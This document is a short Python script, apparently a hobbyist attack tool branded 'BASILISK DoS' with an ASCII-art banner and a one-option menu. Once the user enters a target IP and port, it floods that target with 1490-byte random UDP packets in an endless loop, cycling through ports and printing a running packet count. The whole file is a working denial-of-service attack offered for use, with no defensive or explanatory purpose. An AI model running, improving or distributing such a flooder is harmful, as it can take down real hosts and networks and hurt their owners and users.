import os, random, time, sys, socket
from os import system, name

cgreen = "\u001b[32m"
cred = "\u001b[31m"
cblack = "\u001b[30m"
cblue = "\u001b[34m"
ccyan = "\u001b[36m"
cmagenta = "\u001b[35m"
cwhite = "\u001b[37m"
creset = "\u001b[0m"

ui = f"{cwhite}┌──({cred}basilisk㉿DoS{cwhite})\n└─{cred}$ "

def clear():
    if name == 'nt':
        _ = system('cls')

    else:
        _ = system('clear')


def BASILISK_DOS():
    print(f"{cred}")
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    byte = os.urandom(1490)
    print(f"{cwhite}Target IP: ")
    IP = input(ui)
    print(f"{cwhite}Target Port: ")
    PORT = int(input(ui))
    packets = 0
    while True:
        s.sendto(byte, (IP, PORT))
        packets = packets + 1
        PORT = PORT + 1
        if PORT == 65535:
            PORT = 1
        print(f"{cred}[{cwhite}", packets, f"{cred}]", "Packets Sent from port", f"{cred}[{cwhite}", PORT, f"{cred}]")


clear()
print(f"""{cred}
███   ██      ▄▄▄▄▄   ▄█ █    ▄█    ▄▄▄▄▄   █  █▀     ██▄   ████▄    ▄▄▄▄▄   
█  █  █ █    █     ▀▄ ██ █    ██   █     ▀▄ █▄█       █  █  █   █   █     ▀▄ 
█ ▀ ▄ █▄▄█ ▄  ▀▀▀▀▄   ██ █    ██ ▄  ▀▀▀▀▄   █▀▄       █   █ █   █ ▄  ▀▀▀▀▄   
█  ▄▀ █  █  ▀▄▄▄▄▀    ▐█ ███▄ ▐█  ▀▄▄▄▄▀    █  █      █  █  ▀████  ▀▄▄▄▄▀    
███      █             ▐     ▀ ▐              █       ███▀                   
        █                                    ▀                               
       ▀    {cwhite}
┌──────────────────────────────┐
│[{cred}1{cwhite}] Continuous Attack         │
│[{cred}0{cwhite}] Exit.                     │
└──────────────────────────────┘
""")

s = input(ui)

if s == "1":
    BASILISK_DOS()

elif s == "0":
    print(f"{creset}")
    exit()
elif s != "":
    print("select valid option")

